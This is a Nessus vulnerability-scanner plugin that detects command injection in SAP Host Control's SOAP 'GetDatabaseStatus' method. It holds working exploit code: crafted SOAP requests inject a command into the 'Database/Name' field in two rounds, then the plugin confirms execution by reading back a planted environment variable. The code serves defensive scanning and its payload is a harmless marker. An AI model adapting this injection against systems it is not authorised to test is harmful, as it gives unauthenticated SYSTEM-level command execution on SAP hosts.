#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(62293);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2015/09/24 23:21:20 $");

  script_bugtraq_id(55084);
  script_osvdb_id(84821);
  script_xref(name:"EDB-ID", value:"20944");

  script_name(english:"SAP Host Control SOAP Web Service 'Database/Name' Command Execution (SAP Note 1341333)");
  script_summary(english:"Attempts to set a global environment variable");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a SOAP service that can be abused to
execute arbitrary commands.");
  script_set_attribute(attribute:"description", value:
"The version of SAP Host Control, offered by 'sapstartsrv.exe', fails to
sanitize user input to the 'Database/Name' parameter when calling the
'GetDatabaseStatus' SOAP method.  A remote, unauthenticated attacker may
use this to run commands that, by default, run as SYSTEM.

Note that while this vulnerability affects all platforms, Nessus can
only detect vulnerable instances running on Windows.

Nessus has not removed the global environment variable that it created.
This plugin will not report this host as vulnerable again until the
'MACHINE' key has been deleted from the registry at :

  HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Session Manager\Environment");
  script_set_attribute(attribute:"see_also", value:"https://service.sap.com/sap/support/notes/1341333");
  script_set_attribute(attribute:"see_also", value:"http://www.contextis.com/research/blog/sap4/");
  script_set_attribute(attribute:"solution", value:"Apply the patch referenced in the vendor's advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'SAP NetWeaver HostControl Command Injection');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/08/05");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/05/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/09/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:sap:netweaver");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("os_fingerprint.nasl", "sap_control_detect.nasl", "sap_host_control_detect.nasl");
  script_require_keys("www/sap_control", "www/sap_host_control");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("webapp_func.inc");

function www_ports()
{
  local_var fields, i, ports;

  ports = get_kb_list("www/*/" + _FCT_ANON_ARGS[0]);
  if (!isnull(ports))
   ports = keys(ports);

  if (isnull(ports) || max_index(ports) <= 0)
    exit(1, "No ports.");

  for (i = 0; i < max_index(ports); i++)
  {
    fields = split(ports[i], sep:"/", keep:FALSE);
    ports[i] = int(fields[1]);
  }

  return ports;
}

function soap(cmd, port, type)
{
  local_var xml;

  if (type == "Host Control")
  {
    xml =
      '<?xml version="1.0" encoding="UTF-8"?>
       <SOAP-ENV:Envelope
         xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xmlns:xs="http://www.w3.org/2001/XMLSchema">
         <SOAP-ENV:Body>
           <ns1:GetDatabaseStatus xmlns:ns1="urn:SAPHostControl">
             <aArguments>
               <item>
                 <mKey>Database/Type</mKey>
                 <mValue>ada</mValue>
               </item>
               <item>
                 <mKey>Database/Password</mKey>
                 <mValue>password</mValue>
               </item>
               <item>
                 <mKey>Database/Username</mKey>
                 <mValue>control</mValue>
               </item>
               <item>
                 <mKey>Database/Name</mKey>
                 <mValue>NSP ' + cmd + '</mValue>
               </item>
             </aArguments>
           </ns1:GetDatabaseStatus>
         </SOAP-ENV:Body>
       </SOAP-ENV:Envelope>';
  }
  else
  {
    xml =
      '<?xml version="1.0" encoding="UTF-8"?>
       <SOAP-ENV:Envelope
         xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
         xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xmlns:xsd="http://www.w3.org/2001/XMLSchema"
         xmlns:SAPControl="urn:SAPControl"
         xmlns:SAPCCMS="urn:SAPCCMS"
         xmlns:SAPHostControl="urn:SAPHostControl"
         xmlns:SAPOscol="urn:SAPOscol"
         xmlns:SAPDSR="urn:SAPDSR">
         <SOAP-ENV:Body>
           <SAPControl:GetEnvironment />
         </SOAP-ENV:Body>
       </SOAP-ENV:Envelope>';
  }

  return http_send_recv3(
    port         : port,
    method       : "POST",
    item         : "/",
    add_headers  : make_array("SOAPAction", '""'),
    data         : xml,
    exit_on_fail : TRUE
  );
}

app = "SAP Host Control";

# This is a blind command injection, and we can only see the results
# on Windows.
os = get_kb_item_or_exit("Host/OS");
if (os && "Windows" >!< os)
  audit(AUDIT_OS_NOT, "Windows");

# Get details of the SAP ports.
ports_hc = www_ports("sap_host_control");
ports_c = www_ports("sap_control");

# We want to try and exploit each Host Control port, and then try to
# confirm on any Control port, so branch.
port_hc = branch(ports_hc);
url = build_url(port:port_hc, qs:"/");

# There are a few restrictions on the command we send:
#
# 1) It must be a maximum of 31 bytes.
# 2) It must not contain any spaces.
# 3) It must not contain any double quotes.
cmd = "setx/?|findstr/c:COMPAQ|cmd";

# The exploit above will execute a section of the command's help page,
# setting the following global environment variable.
env = "MACHINE=COMPAQ COMPUTER";

# We need some names for our exploit. The filename has to be short.
file = unixtime() + ".txt";
host = "localhost";

# Put together regexes to match the SOAP responses we hope for.
re_hc = "<faultstring>Generic error.[^<]*</faultstring>";
re_c1 = "<SAPControl:GetEnvironmentResponse><env>.*</env></SAPControl:GetEnvironmentResponse>";
re_c2 = "<item>" + env + "</item>";

# Narrow down the list of Control ports to ones that we can get the
# environment from. If the environment variable is already set, then
# we can't perform the exploit and know if it worked.
ports_env = make_list();
foreach port (ports_c)
{
  res = soap(port:port, type:"Control");
  if (res[2] !~ re_c1)
    continue;

  if (res[2] =~ re_c2)
    exit(1, "The global environment variable, 'MACHINE', created by this exploit already exists.");

  ports_env = make_list(ports_env, port);
}

if (max_index(ports_env) <= 0)
  exit(1, "All SAP Control ports rejected our 'GetEnvironment' SOAP request.");

# Perform the exploit.
rounds = make_list(
  # Try to log in to the database, making sure the error message ends
  # up in file we chose.
  '-o ' + file + ' -n ' + host + '\n!' + cmd + '\n',

  # Provide the error log as a file of commands for the database.
  '-ic ' + file
);

reqs = make_list();
foreach round (rounds)
{
  res = soap(port:port_hc, type:"Host Control", cmd:round);
  if (res[2] !~ re_hc)
    audit(AUDIT_WEB_APP_NOT_AFFECTED, app, url);

  reqs = make_list(reqs, http_last_sent_request());
}

# Try to find a Control port, from the previously vetted list, that
# now has the global environment variable set.
found = FALSE;
foreach port (ports_env)
{
  res = soap(port:port, type:"Control");
  if (res[2] !~ re_c1)
    continue;

  if (res[2] =~ re_c2)
  {
    found = TRUE;
    reqs = make_list(reqs, http_last_sent_request());
    break;
  }
}

if (!found)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, url);

# Report our findings.
report = NULL;
if (report_verbosity > 0)
{
  report =
    '\nNessus was able to perform command injection through the SAP Host' +
    '\nControl SOAP web service. The command executed was :' +
    '\n' +
    '\n  ' + cmd +
    '\n';
}

security_hole(port:port_hc, extra:report);
